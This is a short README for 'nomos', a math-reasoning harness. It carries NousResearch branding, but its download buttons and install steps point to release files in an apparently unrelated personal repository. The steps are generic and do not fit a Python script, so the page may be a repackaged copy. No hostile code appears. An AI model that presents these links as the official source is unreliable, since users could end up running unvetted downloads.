# 🤖 nomos - Easy Math Problem Solving 

<p align="center">
  <a href="https://github.com/gur3245singh/nomos/releases"><img src="https://img.shields.io/badge/Download%20nomos-v1.0-brightgreen" alt="Download nomos"></a>&nbsp;<a href="https://x.com/NousResearch"><img src="https://img.shields.io/badge/X-NousResearch-000000?logo=x&logoColor=white" alt="X (formerly Twitter)"></a>&nbsp;<a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-yellow?logoColor=white" alt="MIT License"></a>&nbsp;<a href="https://huggingface.co/NousResearch/nomos-1"><img src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Model-FFD21E" alt="Hugging Face"></a>
</p>

<p align="center">
  <img height="400" alt="image" src="https://github.com/user-attachments/assets/3f665bb9-f45b-4653-b6e9-a670b1f4c705" />
</p>

A reasoning harness for mathematical problem-solving and proof-writing in natural language.

## 🚀 Getting Started

Follow these simple steps to download and run nomos on your computer.

1. **Visit the Download Page**  
   Go to the [Release Page](https://github.com/gur3245singh/nomos/releases). Here, you can find the latest version. 

2. **Download the Software**  
   On the Release Page, you will find the files available for download. Choose the correct file for your system and click on it to start the download.

3. **Install Required Packages**  
   After downloading nomos, you need to install some software dependencies.

   Open your terminal or command prompt and type the following command:
   ```bash
   pip install -r requirements.txt
   ```

4. **Prepare Your Problem Files**  
   Create a directory on your computer that contains your problem files. Make sure these files have a `.md` extension. This directory will hold all your math problem documents.

## 🛠️ How to Use nomos

Once you have everything set up, you are ready to solve problems. Here’s how to use nomos:

1. Open your terminal or command prompt.

2. Navigate to the directory where you downloaded nomos. Use the `cd` command to change directories.

3. Run the following command:
   ```bash
   python solve_agent.py <problems_dir> [options]
   ```
   Replace `<problems_dir>` with the path to your directory containing the `.md` files.

### 📜 Required Arguments

- `problems_dir`: This is the directory that contains your problems in `.md` format.

### ⚙️ Options

| Flag   | Default | Description                       |
|--------|---------|-----------------------------------|
| `--help`     | Not set | Displays help information              |
| `--verbose`  | Not set | Increases output detail during execution |

## 💡 System Requirements

- **Operating System**: Windows, macOS, or Linux.
- **Python Version**: Python 3.6 or higher.
- **Memory**: At least 1 GB of RAM 

## 🔗 Additional Information

For more updates and community discussions, you can follow our project on [X (formerly Twitter)](https://x.com/NousResearch).

For a detailed understanding of how to write `.md` problem files, refer to the documentation on our GitHub repository.

**Ready to start?** Visit the [Release Page](https://github.com/gur3245singh/nomos/releases) now to download nomos and begin solving mathematical problems with ease!